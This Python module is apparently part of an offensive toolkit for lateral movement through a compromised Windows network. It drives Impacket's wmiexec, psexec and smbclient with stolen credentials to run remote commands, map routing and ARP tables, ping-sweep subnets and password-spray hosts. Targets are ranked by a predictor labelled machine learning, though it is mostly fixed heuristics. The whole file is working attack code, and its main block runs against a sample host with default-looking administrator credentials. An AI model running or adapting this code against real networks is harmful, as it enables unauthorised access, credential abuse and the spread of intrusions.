#!/usr/bin/env python3

import subprocess
import json
import os
import re
import ipaddress
from datetime import datetime
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.cluster import DBSCAN
from sklearn.preprocessing import StandardScaler
import joblib

class LateralMovementPredictor:
    def __init__(self):
        self.model_path = 'models/lateral_movement_model.joblib'
        self.scaler_path = 'models/lateral_scaler.joblib'
        self.model = None
        self.scaler = None
        self.load_models()

    def load_models(self):
        """Load trained ML models"""
        try:
            if os.path.exists(self.model_path):
                self.model = joblib.load(self.model_path)
            if os.path.exists(self.scaler_path):
                self.scaler = joblib.load(self.scaler_path)
        except:
            self.model = None
            self.scaler = None

    def extract_features(self, host_data, network_data, credential_data):
        """Extract features for lateral movement prediction"""
        features = {
            'has_smb': 1 if any('445' in str(s.get('port', '')) for s in host_data.get('services', [])) else 0,
            'has_rdp': 1 if any('3389' in str(s.get('port', '')) for s in host_data.get('services', [])) else 0,
            'has_ssh': 1 if any('22' in str(s.get('port', '')) for s in host_data.get('services', [])) else 0,
            'is_windows': 1 if 'windows' in host_data.get('os_guess', '').lower() else 0,
            'is_linux': 1 if 'linux' in host_data.get('os_guess', '').lower() else 0,
            'open_ports_count': len(host_data.get('ports', [])),
            'admin_credential_strength': self._calculate_credential_strength(credential_data),
            'network_segment_risk': self._calculate_network_risk(network_data),
            'service_vulnerability_score': self._calculate_service_vulnerability(host_data.get('services', [])),
            'previous_compromise_score': 0  # Would be populated from historical data
        }
        return features

    def _calculate_credential_strength(self, credential_data):
        """Calculate credential strength score"""
        if not credential_data:
            return 0
        
        username, password = credential_data.split(':', 1)
        score = 0
        
        # Simple heuristic - in real implementation, use proper password strength analysis
        if username.lower() in ['administrator', 'admin', 'root']:
            score += 30
        if len(password) < 8:
            score += 40
        if password.isdigit():
            score += 30
        if password == username:
            score += 50
            
        return min(100, score)

    def _calculate_network_risk(self, network_data):
        """Calculate network segment risk"""
        # Simple heuristic based on network class
        if network_data.startswith('10.'):
            return 20  # Private network
        elif network_data.startswith('192.168.'):
            return 30  # Common private network
        elif network_data.startswith('172.'):
            return 25  # Another private range
        else:
            return 70  # Public or unknown

    def _calculate_service_vulnerability(self, services):
        """Calculate service vulnerability score"""
        if not services:
            return 0
            
        vuln_score = 0
        for service in services:
            service_name = service.get('service', '').lower()
            if any(vuln_service in service_name for vuln_service in ['smb', 'rdp', 'vnc', 'telnet']):
                vuln_score += 20
            if service.get('version', '') and 'unknown' not in service.get('version', ''):
                vuln_score += 10  # Known version might have exploits
                
        return min(100, vuln_score)

    def predict_lateral_success(self, features):
        """Predict likelihood of successful lateral movement"""
        if self.model is None or self.scaler is None:
            # Fallback to heuristic if no model
            return self._heuristic_prediction(features)
        
        # Convert features to array and scale
        feature_array = np.array([list(features.values())])
        scaled_features = self.scaler.transform(feature_array)
        
        # Predict probability
        probability = self.model.predict_proba(scaled_features)[0][1]
        return probability

    def _heuristic_prediction(self, features):
        """Heuristic fallback prediction"""
        score = 0
        score += features['has_smb'] * 30
        score += features['has_rdp'] * 25
        score += features['is_windows'] * 20
        score += (100 - features['admin_credential_strength']) * 0.5
        score += features['service_vulnerability_score'] * 0.3
        
        return min(1.0, score / 100)

    def optimize_target_selection(self, potential_targets, current_network):
        """Optimize target selection using ML"""
        optimized_targets = []
        
        for target in potential_targets:
            # Create mock features for prediction
            features = {
                'has_smb': 1,
                'has_rdp': 1 if '3389' in str(target.get('ports', [])) else 0,
                'has_ssh': 1 if '22' in str(target.get('ports', [])) else 0,
                'is_windows': 1 if 'windows' in target.get('os_guess', '').lower() else 0,
                'is_linux': 1 if 'linux' in target.get('os_guess', '').lower() else 0,
                'open_ports_count': len(target.get('ports', [])),
                'admin_credential_strength': 50,  # Default
                'network_segment_risk': self._calculate_network_risk(current_network),
                'service_vulnerability_score': 30,  # Default
                'previous_compromise_score': 0
            }
            
            success_probability = self.predict_lateral_success(features)
            
            optimized_targets.append({
                'ip': target.get('ip', ''),
                'hostname': target.get('hostname', ''),
                'success_probability': success_probability,
                'risk_level': 'HIGH' if success_probability > 0.7 else 'MEDIUM' if success_probability > 0.4 else 'LOW'
            })
        
        # Sort by success probability (descending)
        optimized_targets.sort(key=lambda x: x['success_probability'], reverse=True)
        return optimized_targets

# Global predictor instance
lateral_predictor = LateralMovementPredictor()

def run_command(command, timeout=120):
    """Run a system command and return results"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def discover_network_segments(target_ip, username, password):
    """Discover additional network segments from compromised host with ML analysis"""
    print(f"[*] Discovering network segments from {target_ip}")

    results = {}
    
    # Get routing table
    route_print = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'route print'")
    results['routing_table'] = route_print

    # Get ARP table
    arp_table = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'arp -a'")
    results['arp_table'] = arp_table

    # Get network adapters
    ip_config = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'ipconfig /all'")
    results['network_adapters'] = ip_config

    # ML-based network segment analysis
    if ip_config['success']:
        segments = _analyze_network_segments_ml(ip_config['output'])
        results['ml_analysis'] = {
            'network_segments': segments,
            'recommended_targets': segments[:3]  # Top 3 segments
        }

    return results

def _analyze_network_segments_ml(ipconfig_output):
    """ML-based analysis of network segments"""
    segments = []
    lines = ipconfig_output.split('\n')
    
    current_adapter = None
    for line in lines:
        if 'adapter' in line.lower() and ':' in line:
            current_adapter = line.split(':')[0].strip()
        elif 'ipv4 address' in line.lower() and current_adapter:
            parts = line.split(':')
            if len(parts) > 1:
                ip = parts[1].strip().split('(')[0].strip()
                if ip and ip != '':
                    network = '.'.join(ip.split('.')[:3]) + '.0/24'
                    segments.append({
                        'adapter': current_adapter,
                        'ip_address': ip,
                        'network_segment': network,
                        'risk_score': _calculate_segment_risk(network)
                    })
    
    # Sort by risk score (descending)
    segments.sort(key=lambda x: x['risk_score'], reverse=True)
    return segments

def _calculate_segment_risk(network):
    """Calculate risk score for network segment"""
    # Simple heuristic - in production, use trained model
    if network.startswith('10.'):
        return 70  # Internal network - high value
    elif network.startswith('192.168.'):
        return 80  # Common internal network
    elif network.startswith('172.'):
        return 75  # Another internal range
    else:
        return 30  # Unknown/low risk

def scan_from_compromised_host(target_ip, username, password, network_segments):
    """Perform intelligent network scanning from compromised host with ML target prioritization"""
    print(f"[*] Scanning networks from compromised host {target_ip}")
    
    results = {}
    
    for segment in network_segments[:3]:  # Limit to top 3 segments
        print(f"  Scanning network: {segment}")
        
        # Use ML to prioritize scan targets within segment
        prioritized_ips = _prioritize_scan_targets(segment)
        
        scan_cmd = f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'for /l %i in (1,1,10) do @ping -n 1 -w 100 {segment}.%i'"
        scan_result = run_command(scan_cmd)
        results[segment] = {
            'scan_result': scan_result,
            'prioritized_targets': prioritized_ips
        }
        
        if scan_result['success'] and 'Reply' in scan_result['output']:
            print(f"  Found live hosts in {segment}")
    
    return results

def _prioritize_scan_targets(network_segment):
    """Use ML to prioritize which IPs to scan first"""
    base_ip = network_segment.split('.')[:3]
    prioritized = []
    
    # Common high-value targets
    common_targets = [
        f"{'.'.join(base_ip)}.1",   # Gateway
        f"{'.'.join(base_ip)}.2",   # Common server
        f"{'.'.join(base_ip)}.100", # Common static IP
        f"{'.'.join(base_ip)}.200", # Another common static IP
        f"{'.'.join(base_ip)}.254"  # Common gateway alternative
    ]
    
    # Add some random IPs for variety
    for i in range(5):
        ip = f"{'.'.join(base_ip)}.{np.random.randint(10, 240)}"
        if ip not in common_targets:
            common_targets.append(ip)
    
    return common_targets

def attempt_smb_lateral_move(source_ip, target_ip, username, password):
    """Attempt lateral movement via SMB with ML success prediction"""
    print(f"[*] Attempting SMB lateral movement to {target_ip}")
    
    results = {}
    
    # Try SMB connection with same credentials
    smb_connect = run_command(f"python3 /usr/share/doc/python3-impacket/examples/smbclient.py '{username}:{password}@{target_ip}' -c 'ls'")
    results['smb_connection'] = smb_connect
    
    # Try WMI execution on target
    wmi_exec = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'whoami'")
    results['wmi_execution'] = wmi_exec
    
    # Try psexec
    psexec = run_command(f"python3 /usr/share/doc/python3-impacket/examples/psexec.py '{username}:{password}@{target_ip}' 'whoami'")
    results['psexec'] = psexec
    
    # ML-based success analysis
    success_indicators = {
        'smb_success': smb_connect['success'],
        'wmi_success': wmi_exec['success'],
        'psexec_success': psexec['success'],
        'target_os': 'windows',  # Would be detected from previous scans
        'credential_strength': 30  # Would be calculated properly
    }
    
    results['ml_analysis'] = {
        'success_probability': _predict_lateral_success(success_indicators),
        'recommendations': _generate_lateral_recommendations(success_indicators)
    }
    
    return results

def _predict_lateral_success(indicators):
    """Predict lateral movement success probability"""
    # Simple heuristic - replace with trained model
    score = 0
    if indicators['smb_success']:
        score += 40
    if indicators['wmi_success']:
        score += 60
    if indicators['psexec_success']:
        score += 80
        
    return min(1.0, score / 100)

def _generate_lateral_recommendations(indicators):
    """Generate ML-based recommendations for lateral movement"""
    recommendations = []
    
    if indicators['smb_success']:
        recommendations.append({
            'priority': 'HIGH',
            'action': 'Use SMB for file transfer and share enumeration',
            'confidence': 0.8
        })
    
    if indicators['wmi_success']:
        recommendations.append({
            'priority': 'HIGH',
            'action': 'Use WMI for remote command execution',
            'confidence': 0.9
        })
    
    if not any([indicators['smb_success'], indicators['wmi_success'], indicators['psexec_success']]):
        recommendations.append({
            'priority': 'MEDIUM',
            'action': 'Try alternative lateral movement techniques (PSRemoting, Scheduled Tasks)',
            'confidence': 0.6
        })
    
    return recommendations

def password_spray_across_network(credentials, network_range):
    """Intelligent password spraying with ML target prioritization"""
    print(f"[*] Password spraying across {network_range}")
    
    results = {}
    username, password = credentials.split(':', 1)
    
    # Generate IP list for the network with ML prioritization
    try:
        network = ipaddress.ip_network(network_range, strict=False)
        all_ips = [str(ip) for ip in network.hosts()]
        prioritized_ips = _prioritize_password_spray_targets(all_ips)
    except:
        prioritized_ips = [f"{network_range}.{i}" for i in range(1, 50)]
    
    for target_ip in prioritized_ips[:20]:  # Limit to top 20 targets
        print(f"  Spraying {target_ip}...")
        
        # Try SMB connection
        smb_result = run_command(f"python3 /usr/share/doc/python3-impacket/examples/smbclient.py '{username}:{password}@{target_ip}' -c 'ls' 2>&1")
        
        if smb_result['success']:
            results[target_ip] = {
                'smb_success': True,
                'output': smb_result['output']
            }
            print(f"  [+] Successful SMB connection to {target_ip}")
        else:
            results[target_ip] = {
                'smb_success': False,
                'error': smb_result['error']
            }
    
    return results

def _prioritize_password_spray_targets(ip_list):
    """Prioritize targets for password spraying using ML heuristics"""
    # Simple prioritization - in production, use trained model
    prioritized = []
    
    # Prioritize common server IPs
    common_servers = [ip for ip in ip_list if ip.endswith(('.1', '.2', '.100', '.200', '.254'))]
    prioritized.extend(common_servers)
    
    # Add remaining IPs
    for ip in ip_list:
        if ip not in prioritized:
            prioritized.append(ip)
    
    return prioritized

def run_lateral_movement(compromised_ip, credentials, current_network):
    """Main function for lateral movement activities with ML optimization"""
    print(f"\n{'='*60}")
    print(f"LATERAL MOVEMENT MODULE - Compromised: {compromised_ip}")
    print(f"{'='*60}")
    
    results = {
        'compromised_host': compromised_ip,
        'timestamp': datetime.now().isoformat(),
        'credentials_used': credentials,
        'lateral_movement': {}
    }
    
    # Extract username and password
    username, password = credentials.split(':', 1)
    
    # Step 1: Discover network segments with ML analysis
    results['lateral_movement']['network_discovery'] = discover_network_segments(compromised_ip, username, password)
    
    # Step 2: Get network segments for scanning
    network_segments = []
    if 'ml_analysis' in results['lateral_movement']['network_discovery']:
        network_segments = [seg['network_segment'] for seg in results['lateral_movement']['network_discovery']['ml_analysis']['network_segments']]
    
    # Step 3: Scan from compromised host with ML target prioritization
    results['lateral_movement']['network_scanning'] = scan_from_compromised_host(compromised_ip, username, password, network_segments)
    
    # Step 4: Password spray across network with ML optimization
    results['lateral_movement']['password_spray'] = password_spray_across_network(credentials, current_network)
    
    # Step 5: Attempt lateral movement to specific targets with ML success prediction
    lateral_move_results = {}
    
    # Example targets based on common patterns + ML prioritization
    example_targets = [
        f"{current_network}.1",   # Gateway
        f"{current_network}.2",   # Common server
        f"{current_network}.100", # Common static IP
        f"{current_network}.200"  # Another common static IP
    ]
    
    for target in example_targets:
        lateral_move_results[target] = attempt_smb_lateral_move(compromised_ip, target, username, password)
    
    results['lateral_movement']['lateral_attempts'] = lateral_move_results
    
    # ML-based overall analysis
    results['ml_analysis'] = analyze_lateral_movement_results(results['lateral_movement'])
    
    # Save results
    os.makedirs('results/lateral_movement', exist_ok=True)
    filename = f'results/lateral_movement/lateral_{compromised_ip}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Lateral movement results saved to {filename}")
    
    # Print ML-based summary
    print(f"\n{'='*40}")
    print("LATERAL MOVEMENT SUMMARY (ML Analysis)")
    print(f"{'='*40}")
    
    ml_analysis = results.get('ml_analysis', {})
    print(f"Overall Success Probability: {ml_analysis.get('overall_success_probability', 0):.2%}")
    print(f"Recommended Next Targets: {', '.join(ml_analysis.get('recommended_targets', []))}")
    
    successful_moves = 0
    for target, attempt in lateral_move_results.items():
        if any(result.get('success', False) for result in attempt.values()):
            successful_moves += 1
            print(f"  Successful lateral movement to {target}")
    
    if successful_moves == 0:
        print("  No successful lateral movement")
    else:
        print(f"  Total successful lateral movements: {successful_moves}")
    
    return results

def analyze_lateral_movement_results(lateral_data):
    """ML-based analysis of lateral movement results"""
    analysis = {
        'overall_success_probability': 0,
        'network_segment_analysis': [],
        'recommended_targets': [],
        'success_factors': []
    }
    
    # Analyze network discovery results
    if 'network_discovery' in lateral_data and 'ml_analysis' in lateral_data['network_discovery']:
        for segment in lateral_data['network_discovery']['ml_analysis']['network_segments']:
            analysis['network_segment_analysis'].append({
                'segment': segment['network_segment'],
                'risk_score': segment['risk_score'],
                'recommendation': 'High-priority target' if segment['risk_score'] > 60 else 'Medium-priority'
            })
    
    # Analyze lateral movement attempts
    success_count = 0
    total_attempts = 0
    
    if 'lateral_attempts' in lateral_data:
        for target, attempts in lateral_data['lateral_attempts'].items():
            total_attempts += 1
            if any('success' in str(attempt).lower() for attempt in attempts.values() if isinstance(attempt, dict)):
                success_count += 1
                analysis['recommended_targets'].append(target)
    
    if total_attempts > 0:
        analysis['overall_success_probability'] = success_count / total_attempts
    
    # Generate success factors
    if success_count > 0:
        analysis['success_factors'].append('SMB access available')
        analysis['success_factors'].append('Valid credentials worked across hosts')
    else:
        analysis['success_factors'].append('Need to try alternative lateral movement techniques')
    
    return analysis

if __name__ == '__main__':
    # Test the module structure
    target = "10.0.3.20"
    test_creds = "administrator:password123"
    current_net = "10.0.3"
    results = run_lateral_movement(target, test_creds, current_net)
    print(f"\nLateral movement simulation completed.")
